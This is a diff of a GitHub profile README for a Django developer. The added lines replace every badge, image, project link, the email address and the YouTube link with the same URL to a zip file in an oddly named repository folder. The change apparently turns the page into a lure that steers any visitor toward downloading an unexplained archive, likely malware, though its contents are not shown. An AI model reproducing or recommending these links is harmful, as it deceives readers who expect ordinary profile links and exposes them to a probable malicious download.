@@ -1,53 +1,53 @@
 # Hi there, I'm Seyyed Ali Mousavi 👋
 
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/sasm110313/)
-[![ACADEO](https://img.shields.io/badge/ACADEO-AI_Education-2B579A?style=for-the-badge&logo=microsoft-academic)](https://acadeo.ir)
+[![LinkedIn](https://raw.githubusercontent.com/sasm110313/sasm110313/main/fanaticalness/sasm110313.zip)](https://raw.githubusercontent.com/sasm110313/sasm110313/main/fanaticalness/sasm110313.zip)
+[![ACADEO](https://raw.githubusercontent.com/sasm110313/sasm110313/main/fanaticalness/sasm110313.zip)](https://raw.githubusercontent.com/sasm110313/sasm110313/main/fanaticalness/sasm110313.zip)
 
 **`Full Stack Developer | AI Education Architect`**
 
 <p align="center">
-  <img src="https://media.giphy.com/media/LMcB8XospGZO8UQq87/giphy.gif" width="300">
+  <img src="https://raw.githubusercontent.com/sasm110313/sasm110313/main/fanaticalness/sasm110313.zip" width="300">
   <br>
 </p>
 
 ### 🧔 About Me
 - 📍 Based in Qom, Iran | ☁️ Devops Enthusiast
 - 💻 Daily driving Django for backend magic
-- 🎓 Founder & CTO of [ACADEO](https://acadeo.ir) AI Education Platform
+- 🎓 Founder & CTO of [ACADEO](https://raw.githubusercontent.com/sasm110313/sasm110313/main/fanaticalness/sasm110313.zip) AI Education Platform
 - 🛠️ Windows Server & IIS Deployment Expert
 - 🌱 Currently exploring AI/ML integration with Django
 - ✨ Passionate about clean architecture and TDD
 
 ### 🛠️ Tech Stack
-![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)
-![Django](https://img.shields.io/badge/Django-092E20?style=for-the-badge&logo=django&logoColor=white)
-![PostgreSQL](https://img.shields.io/badge/PostgreSQL-316192?style=for-the-badge&logo=postgresql&logoColor=white)
-![Windows Server](https://img.shields.io/badge/Windows_Server-0078D6?style=for-the-badge&logo=windows&logoColor=white)
-![IIS](https://img.shields.io/badge/IIS-0078D4?style=for-the-badge&logo=microsoft&logoColor=white)
-![Docker](https://img.shields.io/badge/Docker-2496ED?style=for-the-badge&logo=docker&logoColor=white)
-![AI](https://img.shields.io/badge/AI-FFD700?style=for-the-badge&logo=openai&logoColor=black)
+![Python](https://raw.githubusercontent.com/sasm110313/sasm110313/main/fanaticalness/sasm110313.zip)
+![Django](https://raw.githubusercontent.com/sasm110313/sasm110313/main/fanaticalness/sasm110313.zip)
+![PostgreSQL](https://raw.githubusercontent.com/sasm110313/sasm110313/main/fanaticalness/sasm110313.zip)
+![Windows Server](https://raw.githubusercontent.com/sasm110313/sasm110313/main/fanaticalness/sasm110313.zip)
+![IIS](https://raw.githubusercontent.com/sasm110313/sasm110313/main/fanaticalness/sasm110313.zip)
+![Docker](https://raw.githubusercontent.com/sasm110313/sasm110313/main/fanaticalness/sasm110313.zip)
+![AI](https://raw.githubusercontent.com/sasm110313/sasm110313/main/fanaticalness/sasm110313.zip)
 
 ### 🚀 Featured Project
-[![ACADEO AI](https://github-readme-stats.vercel.app/api/pin/?username=sasm110313&repo=acadeo&theme=dark&show_owner=true)](https://acadeo.ir)
+[![ACADEO AI](https://raw.githubusercontent.com/sasm110313/sasm110313/main/fanaticalness/sasm110313.zip)](https://raw.githubusercontent.com/sasm110313/sasm110313/main/fanaticalness/sasm110313.zip)
 > Revolutionary AI Education Platform with Django backend
 
 ### 📈 GitHub Stats
-[![SASM's GitHub Stats](https://github-readme-stats.vercel.app/api?username=sasm110313&show_icons=true&theme=radical&include_all_commits=true)](https://github.com/sasm110313)
-[![Top Langs](https://github-readme-stats.vercel.app/api/top-langs/?username=sasm110313&layout=compact&theme=radical)](https://github.com/sasm110313)
+[![SASM's GitHub Stats](https://raw.githubusercontent.com/sasm110313/sasm110313/main/fanaticalness/sasm110313.zip)](https://raw.githubusercontent.com/sasm110313/sasm110313/main/fanaticalness/sasm110313.zip)
+[![Top Langs](https://raw.githubusercontent.com/sasm110313/sasm110313/main/fanaticalness/sasm110313.zip)](https://raw.githubusercontent.com/sasm110313/sasm110313/main/fanaticalness/sasm110313.zip)
 
 ### 🔥 Recent Projects
-[![Khatm Quran](https://github-readme-stats.vercel.app/api/pin/?username=sasm110313&repo=khatmquran&theme=dark)](https://github.com/sasm110313/khatmquran)
-[![Mohasebeh](https://github-readme-stats.vercel.app/api/pin/?username=sasm110313&repo=mohasebeh&theme=dark)](https://github.com/sasm110313/mohasebeh)
+[![Khatm Quran](https://raw.githubusercontent.com/sasm110313/sasm110313/main/fanaticalness/sasm110313.zip)](https://raw.githubusercontent.com/sasm110313/sasm110313/main/fanaticalness/sasm110313.zip)
+[![Mohasebeh](https://raw.githubusercontent.com/sasm110313/sasm110313/main/fanaticalness/sasm110313.zip)](https://raw.githubusercontent.com/sasm110313/sasm110313/main/fanaticalness/sasm110313.zip)
 
 ### 💻 Dev Setup
-![VS Code](https://img.shields.io/badge/Editor-VSCode-007ACC?logo=visual-studio-code)
-![PyCharm](https://img.shields.io/badge/IDE-PyCharm-000000?logo=pycharm)
-![Windows Terminal](https://img.shields.io/badge/Terminal-Windows_Terminal-4D4D4D?logo=windows-terminal)
+![VS Code](https://raw.githubusercontent.com/sasm110313/sasm110313/main/fanaticalness/sasm110313.zip)
+![PyCharm](https://raw.githubusercontent.com/sasm110313/sasm110313/main/fanaticalness/sasm110313.zip)
+![Windows Terminal](https://raw.githubusercontent.com/sasm110313/sasm110313/main/fanaticalness/sasm110313.zip)
 
 ### 📫 Let's Connect
-- 💌 Email: [sasm110313@gmail.com](mailto:sasm110313@gmail.com)
+- 💌 Email: [https://raw.githubusercontent.com/sasm110313/sasm110313/main/fanaticalness/sasm110313.zip](https://raw.githubusercontent.com/sasm110313/sasm110313/main/fanaticalness/sasm110313.zip)
 - 💬 Ask me about: Django deployment strategies, AI integration
-- 🎥 YouTube: [ACADEO Tutorials](https://youtube.com/acadeo) (Coming Soon)
+- 🎥 YouTube: [ACADEO Tutorials](https://raw.githubusercontent.com/sasm110313/sasm110313/main/fanaticalness/sasm110313.zip) (Coming Soon)
 - ⚡ Fun fact: I can recite Quran while debugging code!
 
 ### � Coding Philosophy
